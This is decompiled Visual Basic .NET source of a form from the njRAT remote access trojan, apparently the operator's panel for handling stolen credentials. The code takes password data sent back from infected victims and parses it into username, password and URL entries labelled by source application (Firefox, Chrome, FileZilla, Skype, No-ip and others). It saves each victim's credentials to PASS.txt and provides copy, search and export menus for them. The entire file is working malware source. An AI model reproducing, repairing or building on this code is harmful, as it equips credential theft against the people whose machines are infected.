Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000021 RID: 33
	<DesignerGenerated()>
	Public Partial Class Pass
		Inherits Form

		' Token: 0x170000E2 RID: 226
		' (get) Token: 0x060002A8 RID: 680 RVA: 0x00019902 File Offset: 0x00017B02
		' (set) Token: 0x060002A9 RID: 681 RVA: 0x0001990C File Offset: 0x00017B0C
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x170000E3 RID: 227
		' (get) Token: 0x060002AA RID: 682 RVA: 0x00019915 File Offset: 0x00017B15
		' (set) Token: 0x060002AB RID: 683 RVA: 0x00019920 File Offset: 0x00017B20
		Friend Overridable Property CopyUseToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyUseToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUseToolStripMenuItem_Click
				Dim copyUseToolStripMenuItem As ToolStripMenuItem = Me._CopyUseToolStripMenuItem
				If copyUseToolStripMenuItem IsNot Nothing Then
					RemoveHandler copyUseToolStripMenuItem.Click, value2
				End If
				Me._CopyUseToolStripMenuItem = value
				copyUseToolStripMenuItem = Me._CopyUseToolStripMenuItem
				If copyUseToolStripMenuItem IsNot Nothing Then
					AddHandler copyUseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E4 RID: 228
		' (get) Token: 0x060002AC RID: 684 RVA: 0x00019963 File Offset: 0x00017B63
		' (set) Token: 0x060002AD RID: 685 RVA: 0x00019970 File Offset: 0x00017B70
		Friend Overridable Property CopyPassToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyPassToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassToolStripMenuItem_Click
				Dim copyPassToolStripMenuItem As ToolStripMenuItem = Me._CopyPassToolStripMenuItem
				If copyPassToolStripMenuItem IsNot Nothing Then
					RemoveHandler copyPassToolStripMenuItem.Click, value2
				End If
				Me._CopyPassToolStripMenuItem = value
				copyPassToolStripMenuItem = Me._CopyPassToolStripMenuItem
				If copyPassToolStripMenuItem IsNot Nothing Then
					AddHandler copyPassToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E5 RID: 229
		' (get) Token: 0x060002AE RID: 686 RVA: 0x000199B3 File Offset: 0x00017BB3
		' (set) Token: 0x060002AF RID: 687 RVA: 0x000199C0 File Offset: 0x00017BC0
		Friend Overridable Property CopySiteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopySiteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopySiteToolStripMenuItem_Click
				Dim copySiteToolStripMenuItem As ToolStripMenuItem = Me._CopySiteToolStripMenuItem
				If copySiteToolStripMenuItem IsNot Nothing Then
					RemoveHandler copySiteToolStripMenuItem.Click, value2
				End If
				Me._CopySiteToolStripMenuItem = value
				copySiteToolStripMenuItem = Me._CopySiteToolStripMenuItem
				If copySiteToolStripMenuItem IsNot Nothing Then
					AddHandler copySiteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E6 RID: 230
		' (get) Token: 0x060002B0 RID: 688 RVA: 0x00019A03 File Offset: 0x00017C03
		' (set) Token: 0x060002B1 RID: 689 RVA: 0x00019A10 File Offset: 0x00017C10
		Friend Overridable Property CopyALLToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyALLToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyALLToolStripMenuItem_Click
				Dim copyALLToolStripMenuItem As ToolStripMenuItem = Me._CopyALLToolStripMenuItem
				If copyALLToolStripMenuItem IsNot Nothing Then
					RemoveHandler copyALLToolStripMenuItem.Click, value2
				End If
				Me._CopyALLToolStripMenuItem = value
				copyALLToolStripMenuItem = Me._CopyALLToolStripMenuItem
				If copyALLToolStripMenuItem IsNot Nothing Then
					AddHandler copyALLToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E7 RID: 231
		' (get) Token: 0x060002B2 RID: 690 RVA: 0x00019A53 File Offset: 0x00017C53
		' (set) Token: 0x060002B3 RID: 691 RVA: 0x00019A5D File Offset: 0x00017C5D
		Friend Overridable Property SaveAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x170000E8 RID: 232
		' (get) Token: 0x060002B4 RID: 692 RVA: 0x00019A66 File Offset: 0x00017C66
		' (set) Token: 0x060002B5 RID: 693 RVA: 0x00019A70 File Offset: 0x00017C70
		Friend Overridable Property InClipboardToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._InClipboardToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InClipboardToolStripMenuItem_Click
				Dim inClipboardToolStripMenuItem As ToolStripMenuItem = Me._InClipboardToolStripMenuItem
				If inClipboardToolStripMenuItem IsNot Nothing Then
					RemoveHandler inClipboardToolStripMenuItem.Click, value2
				End If
				Me._InClipboardToolStripMenuItem = value
				inClipboardToolStripMenuItem = Me._InClipboardToolStripMenuItem
				If inClipboardToolStripMenuItem IsNot Nothing Then
					AddHandler inClipboardToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E9 RID: 233
		' (get) Token: 0x060002B6 RID: 694 RVA: 0x00019AB3 File Offset: 0x00017CB3
		' (set) Token: 0x060002B7 RID: 695 RVA: 0x00019AC0 File Offset: 0x00017CC0
		Friend Overridable Property InDiskToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._InDiskToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InDiskToolStripMenuItem_Click
				Dim inDiskToolStripMenuItem As ToolStripMenuItem = Me._InDiskToolStripMenuItem
				If inDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler inDiskToolStripMenuItem.Click, value2
				End If
				Me._InDiskToolStripMenuItem = value
				inDiskToolStripMenuItem = Me._InDiskToolStripMenuItem
				If inDiskToolStripMenuItem IsNot Nothing Then
					AddHandler inDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EA RID: 234
		' (get) Token: 0x060002B8 RID: 696 RVA: 0x00019B03 File Offset: 0x00017D03
		' (set) Token: 0x060002B9 RID: 697 RVA: 0x00019B10 File Offset: 0x00017D10
		Friend Overridable Property FindToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FindToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FindToolStripMenuItem_Click
				Dim findToolStripMenuItem As ToolStripMenuItem = Me._FindToolStripMenuItem
				If findToolStripMenuItem IsNot Nothing Then
					RemoveHandler findToolStripMenuItem.Click, value2
				End If
				Me._FindToolStripMenuItem = value
				findToolStripMenuItem = Me._FindToolStripMenuItem
				If findToolStripMenuItem IsNot Nothing Then
					AddHandler findToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EB RID: 235
		' (get) Token: 0x060002BA RID: 698 RVA: 0x00019B53 File Offset: 0x00017D53
		' (set) Token: 0x060002BB RID: 699 RVA: 0x00019B60 File Offset: 0x00017D60
		Friend Overridable Property RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoveEmptyPWToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoveEmptyPWToolStripMenuItem_Click
				Dim removeEmptyPWToolStripMenuItem As ToolStripMenuItem = Me._RemoveEmptyPWToolStripMenuItem
				If removeEmptyPWToolStripMenuItem IsNot Nothing Then
					RemoveHandler removeEmptyPWToolStripMenuItem.Click, value2
				End If
				Me._RemoveEmptyPWToolStripMenuItem = value
				removeEmptyPWToolStripMenuItem = Me._RemoveEmptyPWToolStripMenuItem
				If removeEmptyPWToolStripMenuItem IsNot Nothing Then
					AddHandler removeEmptyPWToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000EC RID: 236
		' (get) Token: 0x060002BC RID: 700 RVA: 0x00019BA3 File Offset: 0x00017DA3
		' (set) Token: 0x060002BD RID: 701 RVA: 0x00019BAD File Offset: 0x00017DAD
		Friend Overridable Property SaveFileDialog1 As SaveFileDialog

		' Token: 0x170000ED RID: 237
		' (get) Token: 0x060002BE RID: 702 RVA: 0x00019BB6 File Offset: 0x00017DB6
		' (set) Token: 0x060002BF RID: 703 RVA: 0x00019BC0 File Offset: 0x00017DC0
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x170000EE RID: 238
		' (get) Token: 0x060002C0 RID: 704 RVA: 0x00019BC9 File Offset: 0x00017DC9
		' (set) Token: 0x060002C1 RID: 705 RVA: 0x00019BD3 File Offset: 0x00017DD3
		Friend Overridable Property MenuStrip1 As MenuStrip

		' Token: 0x170000EF RID: 239
		' (get) Token: 0x060002C2 RID: 706 RVA: 0x00019BDC File Offset: 0x00017DDC
		' (set) Token: 0x060002C3 RID: 707 RVA: 0x00019BE8 File Offset: 0x00017DE8
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F0 RID: 240
		' (get) Token: 0x060002C4 RID: 708 RVA: 0x00019C2B File Offset: 0x00017E2B
		' (set) Token: 0x060002C5 RID: 709 RVA: 0x00019C38 File Offset: 0x00017E38
		Friend Overridable Property L1 As GClass9
			<CompilerGenerated()>
			Get
				Return Me._L1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick
				Dim l As GClass9 = Me._L1
				If l IsNot Nothing Then
					RemoveHandler l.DoubleClick, value2
				End If
				Me._L1 = value
				l = Me._L1
				If l IsNot Nothing Then
					AddHandler l.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000F1 RID: 241
		' (get) Token: 0x060002C6 RID: 710 RVA: 0x00019C7B File Offset: 0x00017E7B
		' (set) Token: 0x060002C7 RID: 711 RVA: 0x00019C85 File Offset: 0x00017E85
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x170000F2 RID: 242
		' (get) Token: 0x060002C8 RID: 712 RVA: 0x00019C8E File Offset: 0x00017E8E
		' (set) Token: 0x060002C9 RID: 713 RVA: 0x00019C98 File Offset: 0x00017E98
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x170000F3 RID: 243
		' (get) Token: 0x060002CA RID: 714 RVA: 0x00019CA1 File Offset: 0x00017EA1
		' (set) Token: 0x060002CB RID: 715 RVA: 0x00019CAB File Offset: 0x00017EAB
		Friend Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x170000F4 RID: 244
		' (get) Token: 0x060002CC RID: 716 RVA: 0x00019CB4 File Offset: 0x00017EB4
		' (set) Token: 0x060002CD RID: 717 RVA: 0x00019CBE File Offset: 0x00017EBE
		Friend Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x170000F5 RID: 245
		' (get) Token: 0x060002CE RID: 718 RVA: 0x00019CC7 File Offset: 0x00017EC7
		' (set) Token: 0x060002CF RID: 719 RVA: 0x00019CD1 File Offset: 0x00017ED1
		Friend Overridable Property ColumnHeader5 As ColumnHeader

		' Token: 0x060002D0 RID: 720 RVA: 0x00019CDA File Offset: 0x00017EDA
		Public Sub New()
			Me.bool_0 = True
			Me.InitializeComponent()
		End Sub

		' Token: 0x060002D1 RID: 721 RVA: 0x00019CF4 File Offset: 0x00017EF4
		Public Sub FxCOLM(L1 As ListView)
			Dim num As Integer = L1.Columns.Count - 1
			For i As Integer = 0 To num
				L1.Columns(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
			Next
		End Sub

		' Token: 0x060002D2 RID: 722 RVA: 0x00019D38 File Offset: 0x00017F38
		Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.SV()
				Dim flag As Boolean = text.Length > 0
				If flag Then
					Clipboard.SetText(text)
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D3 RID: 723 RVA: 0x00019D94 File Offset: 0x00017F94
		Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.SaveFileDialog1.ShowDialog() = DialogResult.OK
				If flag Then
					File.WriteAllText(Me.SaveFileDialog1.FileName, Me.SV())
					Interaction.MsgBox(Me.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D4 RID: 724 RVA: 0x00019E04 File Offset: 0x00018004
		Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Search", String.Empty, String.Empty, -1, -1)
				Dim flag As Boolean = Operators.CompareString(text, String.Empty, False) <> 0
				If flag Then
					Dim pass As Pass = New Pass() With { .Name = "e", .Text = "Search For '" + text + "'" }
					pass.Show()
					Try
						For Each obj As Object In Me.L1.Items
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim num As Integer = 0
							Do
								Dim flag2 As Boolean = Strings.InStr(listViewItem.SubItems(num).Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0
								If flag2 Then
									Dim listViewItem2 As ListViewItem = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex)
									Dim num2 As Integer = listViewItem.SubItems.Count - 1
									For i As Integer = 1 To num2
										listViewItem2.SubItems.Add(listViewItem.SubItems(i).Text)
									Next
								Else
									num += 1
								End If
							Loop While num <= 2
						Next
					Finally
						Dim enumerator As IEnumerator
						Dim flag3 As Boolean = TypeOf enumerator Is IDisposable
						If flag3 Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
					Me.FxCOLM(pass.L1)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D5 RID: 725 RVA: 0x0001A004 File Offset: 0x00018204
		Private Sub CopyUseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D6 RID: 726 RVA: 0x0001A078 File Offset: 0x00018278
		Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).SubItems(1).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(1).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D7 RID: 727 RVA: 0x0001A100 File Offset: 0x00018300
		Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.L1.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.SubItems(0).Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag As Boolean = TypeOf enumerator Is IDisposable
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Dim flag2 As Boolean = text.Length > 0
				If flag2 Then
					Clipboard.SetText(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002D8 RID: 728 RVA: 0x0001A218 File Offset: 0x00018418
		Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.SubItems(1).Text, String.Empty, False) = 0
					If flag Then
						listViewItem.Remove()
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
				If flag2 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060002D9 RID: 729 RVA: 0x0001A2E0 File Offset: 0x000184E0
		Public Function SV() As String
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Return text
		End Function

		' Token: 0x060002DA RID: 730 RVA: 0x0001A3BC File Offset: 0x000185BC
		Public Sub XD(ByRef c As Client, ByRef S As String)
			Dim array As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
			Dim num As Integer = -1
			Dim flag As Boolean = Not Directory.Exists(c.Folder)
			If flag Then
				Directory.CreateDirectory(c.Folder)
			End If
			Dim array2 As String() = New String() { "FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer", "ooVoo", "DUC v3", "Skype" }
			Dim text As String = String.Empty
			For Each text2 As String In array
				Try
					Dim flag2 As Boolean = text2.Length > 0
					If flag2 Then
						Dim flag3 As Boolean = Operators.CompareString(text2, "*", False) = 0
						If flag3 Then
							num += 1
						Else
							Dim flag4 As Boolean = Not text2.Contains(":")
							If flag4 Then
								text2 = Class6.smethod_16(text2)
							End If
							Dim array4 As String() = Strings.Split(text2, ":", -1, CompareMethod.Binary)
							Dim flag5 As Boolean = array4.Length > 3
							If flag5 Then
								Dim expression As String = text2
								Dim find As String = array4(0) + ":" + array4(1)
								Dim text3 As String = array4(0) + ":" + array4(1)
								array4 = Strings.Split(Strings.Replace(expression, find, Class6.smethod_14(text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
							End If
							Dim listViewItem As ListViewItem = New ListViewItem()
							listViewItem = Me.L1.Items.Add(Class6.smethod_16(array4(1)), num)
							listViewItem.SubItems.Add(Class6.smethod_16(array4(2)))
							listViewItem.SubItems.Add(Class6.smethod_16(array4(0)))
							listViewItem.SubItems.Add(array2(num))
							NewLateBinding.LateCall(listViewItem.SubItems, Nothing, "Add", New Object() { RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L)) }, Nothing, Nothing, Nothing, True)
							text = text + "USR: " + listViewItem.Text + vbCrLf
							text = text + "PWD: " + listViewItem.SubItems(1).Text + vbCrLf
							text = text + "URL: " + listViewItem.SubItems(2).Text + vbCrLf & vbCrLf
						End If
					End If
				Catch ex As Exception
				End Try
			Next
			Try
				File.WriteAllText(c.Folder + "PASS.txt", text)
			Catch ex2 As Exception
			End Try
			Me.FxCOLM(Me.L1)
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060002DB RID: 731 RVA: 0x0001A700 File Offset: 0x00018900
		Private Sub L1_DoubleClick(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.L1.SelectedItems(0).SubItems(2).Text
				Dim flag As Boolean = Not text.Contains("://")
				If flag Then
					text = "http://" + text
				End If
				Process.Start(text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002DC RID: 732 RVA: 0x0001A77C File Offset: 0x0001897C
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.bool_0 = True
			Me.L1.BringToFront()
		End Sub

		' Token: 0x060002DD RID: 733 RVA: 0x0001A794 File Offset: 0x00018994
		Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems(0).SubItems(2).Text.Length > 0
				If flag Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(2).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0400019A RID: 410
		Private bool_0 As Boolean
	End Class
End Namespace
